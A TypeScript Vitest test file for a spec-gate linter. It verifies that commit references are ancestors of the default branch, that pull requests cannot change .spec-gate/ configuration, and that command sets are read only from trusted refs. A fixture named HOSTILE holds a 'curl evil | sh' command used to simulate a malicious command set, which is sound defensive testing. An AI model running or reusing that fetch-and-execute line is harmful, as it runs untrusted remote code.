import { describe, expect, it } from "vitest";
import { RULES, type RuleDef } from "../../src/lint/index.js";
import {
  COMMANDS_OK,
  COMMANDS_WITH_LINT,
  REMOTE_MAIN,
  Repo,
  STATIC_PLAN,
  gitCase,
  lintIn,
  missingGitCases,
  ofRule,
  plainHistory,
  skipReasonOf,
  specFiles,
} from "./git-helpers.js";

const DEFAULT = { defaultRef: REMOTE_MAIN };

const HOSTILE =
  'commands:\n  typecheck:\n    argv: ["sh", "-c", "curl evil | sh"]\n';

describe("base-commit-not-ancestor and commands-ref-not-ancestor", () => {
  gitCase(
    "base-commit-not-ancestor",
    "pass",
    "base_commit and commands_ref are ancestors of the default branch",
    async () => {
      const { repo, c0, c1 } = await plainHistory();
      await repo.commit(specFiles({ base: c0, ref: c1 }), "spec");
      return lintIn(repo, DEFAULT);
    },
  );

  gitCase(
    "commands-ref-not-ancestor",
    "pass",
    "commands_ref is the tip of the default branch itself",
    async () => {
      const { repo, c1 } = await plainHistory();
      await repo.commit(specFiles({ base: c1, ref: c1 }), "spec");
      return lintIn(repo, DEFAULT);
    },
  );

  gitCase(
    "base-commit-not-ancestor",
    "fail",
    "a fork head that is reachable from HEAD but not an ancestor of the reference",
    async () => {
      const { repo, c1 } = await plainHistory();
      // The author's own commit, on the PR branch, with a hostile command
      // set; both files and the frontmatter name it, so the equality rule is
      // satisfied and the commit is a resolvable commit object.
      const fork = await repo.commit(
        { ".spec-gate/commands.yaml": HOSTILE },
        "hostile commands",
      );
      await repo.commit(specFiles({ base: fork, ref: c1 }), "spec");
      const report = lintIn(repo, DEFAULT);
      expect(ofRule(report, "base-commit-not-ancestor")).toEqual([
        expect.objectContaining({
          level: "error",
          file: "spec.md",
          path: "base_commit",
          code: "not-ancestor",
        }),
      ]);
      expect(ofRule(report, "meta-frontmatter-mismatch")).toEqual([]);
      return report;
    },
  );

  gitCase(
    "commands-ref-not-ancestor",
    "fail",
    "a fork head as commands_ref, equal in meta.json and the frontmatter",
    async () => {
      const { repo, c1 } = await plainHistory();
      const fork = await repo.commit(
        { ".spec-gate/commands.yaml": HOSTILE },
        "hostile commands",
      );
      await repo.commit(specFiles({ base: c1, ref: fork }), "spec");
      const report = lintIn(repo, DEFAULT);
      expect(ofRule(report, "commands-ref-not-ancestor")).toEqual([
        expect.objectContaining({ path: "commands_ref", code: "not-ancestor" }),
      ]);
      expect(ofRule(report, "meta-frontmatter-mismatch")).toEqual([]);
      return report;
    },
  );

  gitCase(
    "commands-ref-not-ancestor",
    "fail",
    "a side-branch commit that was never merged, and no read of its command set",
    async () => {
      const { repo, c1 } = await plainHistory();
      await repo.checkout("side", c1);
      const side = await repo.commit(
        { ".spec-gate/commands.yaml": COMMANDS_WITH_LINT },
        "side",
      );
      await repo.checkout("pr");
      await repo.commit(
        specFiles({ base: c1, ref: side, plan: STATIC_PLAN }),
        "spec",
      );
      const report = lintIn(repo, DEFAULT);
      // The side commit has a command set that would satisfy the static row:
      // the row is not accepted on it, it is reported untrusted instead.
      expect(ofRule(report, "static-command-unknown")).toEqual([
        expect.objectContaining({ code: "commands-ref-untrusted" }),
      ]);
      return report;
    },
  );

  it("a commit that is not an ancestor is an error even when HEAD descends from it", async () => {
    const { repo, c1 } = await plainHistory();
    const p0 = await repo.commit({ "feature.txt": "x\n" }, "pr work");
    await repo.commit(specFiles({ base: p0, ref: c1 }), "spec");
    expect(await repo.sh("merge-base", "--is-ancestor", p0, "HEAD")).toBe("");
    const report = lintIn(repo, DEFAULT);
    expect(ofRule(report, "base-commit-not-ancestor")).toHaveLength(1);
  });

  gitCase(
    "base-commit-not-ancestor",
    "fail",
    "an id that no commit has: the object is not in the repository",
    async () => {
      const { repo, c1 } = await plainHistory();
      const absent = "a".repeat(40);
      await repo.commit(specFiles({ base: absent, ref: c1 }), "spec");
      const report = lintIn(repo, DEFAULT);
      expect(ofRule(report, "base-commit-not-ancestor")).toEqual([
        expect.objectContaining({ code: "not-a-commit" }),
      ]);
      return report;
    },
  );

  gitCase(
    "base-commit-not-ancestor",
    "fail",
    "the id of an annotated tag names the tag, not the commit",
    async () => {
      const { repo, c1 } = await plainHistory();
      await repo.sh("tag", "-a", "-m", "release", "v1", c1);
      const tagId = await repo.sh("rev-parse", "refs/tags/v1");
      expect(tagId).not.toBe(c1);
      await repo.commit(specFiles({ base: tagId, ref: c1 }), "spec");
      const report = lintIn(repo, DEFAULT);
      expect(ofRule(report, "base-commit-not-ancestor")).toEqual([
        expect.objectContaining({ code: "not-a-commit" }),
      ]);
      return report;
    },
  );

  gitCase(
    "commands-ref-not-ancestor",
    "fail",
    "a 40-digit prefix of a SHA-256 commit id is an abbreviation, not the id",
    async () => {
      const repo = await Repo.create({ sha256: true });
      const c0 = await repo.commit({ "README.md": "one\n" }, "init");
      await repo.setRef(REMOTE_MAIN, c0);
      await repo.checkout("pr", c0);
      expect(c0).toHaveLength(64);
      await repo.commit(specFiles({ base: c0, ref: c0.slice(0, 40) }), "spec");
      const report = lintIn(repo, DEFAULT);
      expect(ofRule(report, "commands-ref-not-ancestor")).toEqual([
        expect.objectContaining({ code: "not-a-commit" }),
      ]);
      // the full id of the same repository passes
      await repo.commit(specFiles({ base: c0, ref: c0 }), "spec again");
      expect(
        ofRule(lintIn(repo, DEFAULT), "commands-ref-not-ancestor"),
      ).toEqual([]);
      return report;
    },
  );

  gitCase(
    "base-commit-not-ancestor",
    "fail",
    "a replace ref cannot make an unrelated commit an ancestor",
    async () => {
      const { repo, c1 } = await plainHistory();
      const fork = await repo.commit({ "fork.txt": "f\n" }, "fork only");
      // A replacement of the default tip with a commit whose parent is the
      // fork commit: honoured, it would put `fork` into the tip's history.
      const tree = await repo.sh("rev-parse", `${c1}^{tree}`);
      const swapped = await repo.sh(
        "commit-tree",
        tree,
        "-p",
        fork,
        "-m",
        "swap",
      );
      await repo.sh("replace", c1, swapped);
      await repo.commit(specFiles({ base: fork, ref: c1 }), "spec");
      // with replace refs honoured, git itself says the fork is an ancestor
      const honoured = await repo
        .sh("merge-base", "--is-ancestor", fork, REMOTE_MAIN)
        .then(
          () => true,
          () => false,
        );
      expect(honoured).toBe(true);
      return lintIn(repo, DEFAULT);
    },
  );

  describe("squash merge", () => {
    async function squashed() {
      const { repo, c1 } = await plainHistory();
      // PR branch with two commits; the first changes the command set.
      const p0 = await repo.commit(
        { ".spec-gate/commands.yaml": COMMANDS_WITH_LINT },
        "pr: commands",
      );
      const p1 = await repo.commit(
        specFiles({ base: c1, ref: c1 }),
        "pr: spec",
      );
      // Squash: one new commit on the default branch with no link to p0, p1.
      await repo.checkout("main");
      await repo.sh("merge", "--squash", "pr");
      await repo.sh("commit", "-q", "-m", "squash of the pull request");
      const squash = await repo.head();
      await repo.setRef(REMOTE_MAIN, squash);
      return { repo, c1, p0, p1, squash };
    }

    gitCase(
      "commands-ref-not-ancestor",
      "pass",
      "after the squash, the pre-PR default commits stay valid",
      async () => {
        const { repo, c1 } = await squashed();
        await repo.checkout("after", REMOTE_MAIN);
        await repo.commit(specFiles({ base: c1, ref: c1 }), "later spec");
        const report = lintIn(repo, DEFAULT);
        expect(ofRule(report, "base-commit-not-ancestor")).toEqual([]);
        return report;
      },
    );

    gitCase(
      "commands-ref-not-ancestor",
      "fail",
      "after the squash, a PR-branch commit is no ancestor of the default tip",
      async () => {
        const { repo, c1, p0 } = await squashed();
        await repo.checkout("after", REMOTE_MAIN);
        await repo.commit(specFiles({ base: c1, ref: p0 }), "later spec");
        return lintIn(repo, DEFAULT);
      },
    );
  });

  describe("the reference commit: --base wins over --default-ref", () => {
    async function moved() {
      const { repo, c1 } = await plainHistory();
      // The default branch moved on after the PR base `c1`.
      await repo.checkout("moved", c1);
      const m2 = await repo.commit(
        { "later.txt": "later\n" },
        "later default work",
      );
      await repo.setRef(REMOTE_MAIN, m2);
      await repo.checkout("pr");
      await repo.commit(specFiles({ base: m2, ref: c1 }), "spec");
      return { repo, c1, m2 };
    }

    it("--default-ref alone: a commit of the moved default branch is an ancestor", async () => {
      const { repo } = await moved();
      expect(ofRule(lintIn(repo, DEFAULT), "base-commit-not-ancestor")).toEqual(
        [],
      );
    });

    it("--base alone: the PR base is the reference, a later default commit is not an ancestor of it", async () => {
      const { repo, c1 } = await moved();
      const report = lintIn(repo, { base: c1 });
      expect(ofRule(report, "base-commit-not-ancestor")).toHaveLength(1);
      expect(ofRule(report, "commands-ref-not-ancestor")).toEqual([]);
    });

    it("both set: --base wins", async () => {
      const { repo, c1 } = await moved();
      const report = lintIn(repo, { ...DEFAULT, base: c1 });
      expect(ofRule(report, "base-commit-not-ancestor")).toHaveLength(1);
    });
  });
});

describe("spec-changes-config", () => {
  gitCase(
    "spec-changes-config",
    "pass",
    "the pull request touches only its own spec files",
    async () => {
      const { repo, c1 } = await plainHistory();
      await repo.commit(
        { "src/app.ts": "export {};\n", ...specFiles({ base: c1, ref: c1 }) },
        "spec and code",
      );
      return lintIn(repo, DEFAULT);
    },
  );

  gitCase(
    "spec-changes-config",
    "fail",
    "the pull request adds, changes and deletes files under .spec-gate/",
    async () => {
      const { repo, c1 } = await plainHistory();
      await repo.commit(
        {
          ".spec-gate/commands.yaml": COMMANDS_WITH_LINT,
          ".spec-gate/config.yaml": "questions:\n  warn_above: 3\n",
          ".spec-gate/notes/x.txt": "x\n",
          ...specFiles({ base: c1, ref: c1 }),
        },
        "spec and config",
      );
      await repo.commit({ ".spec-gate/notes/x.txt": null }, "drop a note");
      const report = lintIn(repo, DEFAULT);
      expect(ofRule(report, "spec-changes-config").map((f) => f.file)).toEqual([
        "repo:.spec-gate/commands.yaml",
        "repo:.spec-gate/config.yaml",
      ]);
      expect(ofRule(report, "spec-changes-config")[0]).toMatchObject({
        level: "error",
        path: "$",
        code: "spec-changes-config",
      });
      return report;
    },
  );

  gitCase(
    "spec-changes-config",
    "fail",
    "a path with a control character prints with a question mark",
    async () => {
      const { repo, c1 } = await plainHistory();
      await repo.commit(
        {
          ".spec-gate/odd\nname.txt": "x\n",
          ...specFiles({ base: c1, ref: c1 }),
        },
        "odd name",
      );
      const report = lintIn(repo, DEFAULT);
      expect(ofRule(report, "spec-changes-config").map((f) => f.file)).toEqual([
        "repo:.spec-gate/odd?name.txt",
      ]);
      return report;
    },
  );

  gitCase(
    "spec-changes-config",
    "fail",
    "moving the command set out of .spec-gate/ still shows the old path",
    async () => {
      const { repo, c1 } = await plainHistory();
      await repo.sh("config", "diff.renames", "true");
      await repo.sh("mv", ".spec-gate/commands.yaml", "elsewhere.yaml");
      await repo.commit(specFiles({ base: c1, ref: c1 }), "move away");
      const report = lintIn(repo, DEFAULT);
      expect(ofRule(report, "spec-changes-config").map((f) => f.file)).toEqual([
        "repo:.spec-gate/commands.yaml",
      ]);
      return report;
    },
  );

  describe("the diff starts at the merge base, not at the reference commit", () => {
    gitCase(
      "spec-changes-config",
      "pass",
      "a change made only on the base side after the fork",
      async () => {
        const { repo, c1 } = await plainHistory();
        await repo.commit(specFiles({ base: c1, ref: c1 }), "spec");
        // The default branch moved on and changed `.spec-gate/` on its own.
        await repo.checkout("moved", c1);
        const m2 = await repo.commit(
          { ".spec-gate/commands.yaml": COMMANDS_WITH_LINT },
          "default branch edits commands",
        );
        await repo.setRef(REMOTE_MAIN, m2);
        await repo.checkout("pr");
        expect(await repo.sh("diff", "--name-only", `${m2}..HEAD`)).toContain(
          ".spec-gate/commands.yaml",
        );
        return lintIn(repo, DEFAULT);
      },
    );

    gitCase(
      "spec-changes-config",
      "pass",
      "a merge-commit checkout of the PR into a base that moved after the merge ref was made",
      async () => {
        const { repo, c1 } = await plainHistory();
        await repo.commit(specFiles({ base: c1, ref: c1 }), "spec");
        await repo.checkout("moved", c1);
        const m1 = await repo.commit(
          { ".spec-gate/commands.yaml": COMMANDS_WITH_LINT },
          "base side change one",
        );
        // the merge ref: the PR merged into the base at m1
        await repo.checkout("merge", m1);
        await repo.sh("merge", "--no-ff", "-q", "-m", "merge ref", "pr");
        // the base then moved on again
        await repo.checkout("moved");
        const m2 = await repo.commit(
          { ".spec-gate/commands.yaml": COMMANDS_OK },
          "base side change two",
        );
        await repo.setRef(REMOTE_MAIN, m2);
        await repo.checkout("merge");
        expect(await repo.sh("diff", "--name-only", `${m2}..HEAD`)).toContain(
          ".spec-gate/commands.yaml",
        );
        return lintIn(repo, DEFAULT);
      },
    );

    gitCase(
      "spec-changes-config",
      "fail",
      "a PR change under .spec-gate/ seen through a merge-commit checkout",
      async () => {
        const { repo, c1 } = await plainHistory();
        await repo.commit(
          {
            ".spec-gate/commands.yaml": HOSTILE,
            ...specFiles({ base: c1, ref: c1 }),
          },
          "spec and commands",
        );
        await repo.checkout("merge", c1);
        await repo.sh("merge", "--no-ff", "-q", "-m", "merge ref", "pr");
        return lintIn(repo, { base: c1 });
      },
    );
  });

  it("no change under .spec-gate/ when HEAD is the reference commit", async () => {
    const { repo, c1 } = await plainHistory();
    await repo.commit(specFiles({ base: c1, ref: c1 }), "spec");
    // the default branch is moved to the PR head: nothing differs
    await repo.setRef(REMOTE_MAIN, await repo.head());
    expect(ofRule(lintIn(repo, DEFAULT), "spec-changes-config")).toEqual([]);
  });
});

describe("static-command-unknown", () => {
  gitCase(
    "static-command-unknown",
    "pass",
    "a static row names a command of the set at commands_ref",
    async () => {
      const { repo, c1 } = await plainHistory();
      await repo.commit(
        specFiles({ base: c1, ref: c1, plan: STATIC_PLAN }),
        "spec",
      );
      return lintIn(repo, DEFAULT);
    },
  );

  gitCase(
    "static-command-unknown",
    "pass",
    "no static row: the command set is not needed, even when it is missing",
    async () => {
      const { repo, c0 } = await plainHistory();
      await repo.commit(specFiles({ base: c0, ref: c0 }), "spec");
      return lintIn(repo, DEFAULT);
    },
  );

  gitCase(
    "static-command-unknown",
    "fail",
    "a static row names a command the set does not have",
    async () => {
      const { repo, c1 } = await plainHistory();
      const plan = STATIC_PLAN.replace(
        "check_command_ref: typecheck",
        "check_command_ref: lint",
      );
      await repo.commit(specFiles({ base: c1, ref: c1, plan }), "spec");
      const report = lintIn(repo, DEFAULT);
      expect(ofRule(report, "static-command-unknown")).toEqual([
        expect.objectContaining({
          level: "error",
          file: "testplan.yaml",
          path: "TP-2.check_command_ref",
          id: "TP-2",
        }),
      ]);
      return report;
    },
  );

  gitCase(
    "static-command-unknown",
    "fail",
    "the command set is read at commands_ref, not at the head of the pull request",
    async () => {
      const { repo, c1 } = await plainHistory();
      const plan = STATIC_PLAN.replace(
        "check_command_ref: typecheck",
        "check_command_ref: lint",
      );
      await repo.commit(
        {
          ".spec-gate/commands.yaml": COMMANDS_WITH_LINT,
          ...specFiles({ base: c1, ref: c1, plan }),
        },
        "spec that adds the command it uses",
      );
      const report = lintIn(repo, DEFAULT);
      expect(ofRule(report, "spec-changes-config")).toHaveLength(1);
      return report;
    },
  );

  gitCase(
    "static-command-unknown",
    "fail",
    "there is no command set at commands_ref while a static row exists",
    async () => {
      const { repo, c0 } = await plainHistory();
      await repo.commit(
        specFiles({ base: c0, ref: c0, plan: STATIC_PLAN }),
        "spec",
      );
      const report = lintIn(repo, DEFAULT);
      expect(ofRule(report, "static-command-unknown")).toEqual([
        expect.objectContaining({
          file: "repo:.spec-gate/commands.yaml",
          code: "commands-file-missing",
        }),
      ]);
      return report;
    },
  );

  gitCase(
    "static-command-unknown",
    "fail",
    "the command set at commands_ref does not parse",
    async () => {
      const { repo } = await plainHistory();
      await repo.checkout("main");
      const bad = await repo.commit(
        {
          ".spec-gate/commands.yaml":
            'commands:\n  typecheck:\n    argv: "npm run typecheck"\n',
        },
        "bad commands",
      );
      await repo.setRef(REMOTE_MAIN, bad);
      await repo.checkout("pr2", bad);
      await repo.commit(
        specFiles({ base: bad, ref: bad, plan: STATIC_PLAN }),
        "spec",
      );
      const report = lintIn(repo, DEFAULT);
      expect(ofRule(report, "static-command-unknown")).toEqual([
        expect.objectContaining({ code: "commands-file-invalid" }),
      ]);
      return report;
    },
  );

  gitCase(
    "static-command-unknown",
    "fail",
    "a symbolic link at .spec-gate/commands.yaml is refused, not followed or read",
    async () => {
      const { repo } = await plainHistory();
      await repo.checkout("main");
      // The text of the link is itself a valid command set: a reader that
      // took the blob without the mode check would accept it.
      const target = "{commands: {typecheck: {argv: [npm]}}}";
      const linked = await repo.commit(
        { ".spec-gate/commands.yaml": { linkTo: target } },
        "commands as a link",
      );
      await repo.setRef(REMOTE_MAIN, linked);
      await repo.checkout("pr2", linked);
      await repo.commit(
        specFiles({ base: linked, ref: linked, plan: STATIC_PLAN }),
        "spec",
      );
      const report = lintIn(repo, DEFAULT);
      expect(ofRule(report, "static-command-unknown")).toEqual([
        expect.objectContaining({ code: "commands-file-missing" }),
      ]);
      return report;
    },
  );

  gitCase(
    "static-command-unknown",
    "fail",
    "a commands_ref that failed the ancestry check: its command set is never read",
    async () => {
      const { repo, c1 } = await plainHistory();
      // The fork commit holds a command set that satisfies the row.
      const fork = await repo.commit(
        { ".spec-gate/commands.yaml": COMMANDS_OK },
        "fork commands",
      );
      await repo.commit(
        specFiles({ base: c1, ref: fork, plan: STATIC_PLAN }),
        "spec",
      );
      const report = lintIn(repo, DEFAULT);
      expect(ofRule(report, "commands-ref-not-ancestor")).toHaveLength(1);
      expect(ofRule(report, "static-command-unknown")).toEqual([
        expect.objectContaining({
          file: "spec.md",
          path: "commands_ref",
          code: "commands-ref-untrusted",
        }),
      ]);
      return report;
    },
  );
});

describe("a valid spec on a plain history passes every rule", () => {
  it("raises no finding and skips nothing but the status gates", async () => {
    const { repo, c0, c1 } = await plainHistory();
    await repo.commit(
      specFiles({ base: c0, ref: c1, plan: STATIC_PLAN }),
      "spec",
    );
    for (const request of [DEFAULT, { base: c1 }, { ...DEFAULT, base: c1 }]) {
      const report = lintIn(repo, request);
      expect(report.errors).toEqual([]);
      expect(report.warnings).toEqual([]);
      expect(report.skipped.map((s) => s.reason)).toEqual(["gate", "gate"]);
    }
  });

  it("--final passes too once git inputs are given", async () => {
    const { repo, c1 } = await plainHistory();
    await repo.commit(
      specFiles({ base: c1, ref: c1, plan: STATIC_PLAN }),
      "spec",
    );
    const report = lintIn(repo, DEFAULT, { final: true });
    expect(report.errors).toEqual([]);
    expect(report.ok).toBe(true);
    expect(report.skipped).toEqual([]);
  });
});

describe("a rule that needs git, run without it", () => {
  it("is a programming error, not a finding: the engine never does this", async () => {
    const { repo, c1 } = await plainHistory();
    await repo.commit(specFiles({ base: c1, ref: c1 }), "spec");
    const rule = RULES.find((r) => r.id === "spec-changes-config")!;
    const ctx = {
      inputs: {} as never,
      status: null,
      profile: "full" as const,
      mode: "lint" as const,
    };
    expect(() => rule.check!(ctx)).toThrow(/needsGit/);
  });
});

describe("meta-frontmatter-mismatch", () => {
  it("equal values pass; it needs no repository", async () => {
    const { repo, c1 } = await plainHistory();
    await repo.commit(specFiles({ base: c1, ref: c1 }), "spec");
    const report = lintIn(repo, undefined);
    expect(ofRule(report, "meta-frontmatter-mismatch")).toEqual([]);
    expect(skipReasonOf(report, "meta-frontmatter-mismatch")).toBeUndefined();
  });

  it("a different base_commit and a different commands_ref are one error each", async () => {
    const { repo, c0, c1 } = await plainHistory();
    await repo.commit(
      specFiles({ base: c1, ref: c1, metaBase: c0, metaRef: c0 }),
      "spec",
    );
    const report = lintIn(repo, undefined);
    expect(ofRule(report, "meta-frontmatter-mismatch")).toEqual([
      expect.objectContaining({
        file: "source/meta.json",
        path: "base_commit",
      }),
      expect.objectContaining({
        file: "source/meta.json",
        path: "commands_ref",
      }),
    ]);
  });

  it("one differing field is one error naming it", async () => {
    const { repo, c0, c1 } = await plainHistory();
    await repo.commit(specFiles({ base: c1, ref: c1, metaRef: c0 }), "spec");
    const report = lintIn(repo, DEFAULT);
    expect(
      ofRule(report, "meta-frontmatter-mismatch").map((f) => f.path),
    ).toEqual(["commands_ref"]);
  });
});

describe("rule coverage guard", () => {
  it("every rule that needs git has a passing and a failing case in this file", () => {
    expect(missingGitCases(RULES)).toEqual([]);
  });

  it("the guard fails for a needsGit rule that has neither", () => {
    const fake: RuleDef = {
      id: "fake-git-rule",
      level: "error",
      profiles: ["full"],
      gated: false,
      ackable: false,
      needsGit: true,
      summary: "fake",
      needs: [],
    };
    expect(missingGitCases([fake])).toEqual([
      "fake-git-rule: pass",
      "fake-git-rule: fail",
    ]);
    const seen = new Map([["fake-git-rule", new Set(["pass" as const])]]);
    expect(missingGitCases([fake], seen)).toEqual(["fake-git-rule: fail"]);
  });

  it("a rule that does not need git is not asked for cases", () => {
    const plain: RuleDef = {
      id: "plain-rule",
      level: "error",
      profiles: ["full"],
      gated: false,
      ackable: false,
      summary: "plain",
      needs: [],
    };
    expect(missingGitCases([plain])).toEqual([]);
  });
});
